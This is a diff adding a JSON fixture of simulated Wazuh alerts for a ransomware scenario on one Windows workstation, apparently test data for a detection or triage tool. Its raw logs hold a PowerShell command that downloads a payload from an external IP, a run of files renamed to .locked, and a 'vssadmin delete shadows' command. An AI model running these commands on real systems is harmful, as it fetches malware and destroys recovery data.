@@ -1,0 +1,706 @@
+[
+  {
+    "alert_id": "wazuh-scenario2-001",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:00Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "92201",
+      "level": 12,
+      "description": "Suspicious PowerShell command: Invoke-WebRequest downloading from internet",
+      "mitre": {
+        "id": [
+          "T1059.001"
+        ],
+        "tactic": [
+          "Execution"
+        ],
+        "technique": [
+          "Command and Scripting Interpreter: PowerShell"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 443,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:00 win-workstation-01 Sysmon: PowerShell.exe -Command Invoke-WebRequest -Uri http://198.51.100.99/payload.exe -OutFile C:\\Users\\Public\\payload.exe"
+  },
+  {
+    "alert_id": "wazuh-scenario2-002",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:15Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_001.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:15 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_001.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-003",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:20Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_002.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:20 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_002.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-004",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:25Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_003.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:25 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_003.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-005",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:30Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_004.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:30 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_004.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-006",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:35Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_005.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:35 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_005.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-007",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:40Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_006.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:40 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_006.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-008",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:45Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_007.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:45 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_007.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-009",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:50Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_008.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:50 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_008.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-010",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:10:55Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_009.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:10:55 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_009.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-011",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:11:00Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_010.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:11:00 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_010.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-012",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:11:05Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_011.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:11:05 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_011.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-013",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:11:10Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_012.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:11:10 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_012.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-014",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:11:15Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_013.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:11:15 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_013.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-015",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:11:20Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_014.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:11:20 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_014.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-016",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:11:25Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_015.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:11:25 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_015.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-017",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:11:30Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_016.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:11:30 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_016.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-018",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:11:35Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_017.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:11:35 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_017.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-019",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:11:40Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_018.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:11:40 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_018.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-020",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:11:45Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_019.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:11:45 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_019.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-021",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:11:50Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "5903",
+      "level": 11,
+      "description": "Multiple files modified in rapid succession: document_020.docx -> .locked",
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:11:50 win-workstation-01 Sysmon: FileCreate C:\\Users\\Public\\Documents\\document_020.docx.locked"
+  },
+  {
+    "alert_id": "wazuh-scenario2-022",
+    "source": "wazuh",
+    "timestamp": "2026-11-13T12:12:00Z",
+    "agent": {
+      "id": "002",
+      "name": "win-workstation-01",
+      "ip": "192.168.10.75"
+    },
+    "rule": {
+      "id": "92300",
+      "level": 15,
+      "description": "Shadow copy deletion command executed: vssadmin delete shadows /all /quiet",
+      "mitre": {
+        "id": [
+          "T1490"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Inhibit System Recovery"
+        ]
+      }
+    },
+    "data": {
+      "src_ip": null,
+      "dst_port": 0,
+      "user": "SYSTEM"
+    },
+    "raw_log": "Nov 13 12:12:00 win-workstation-01 Sysmon: Process cmd.exe: vssadmin delete shadows /all /quiet"
+  }
+]
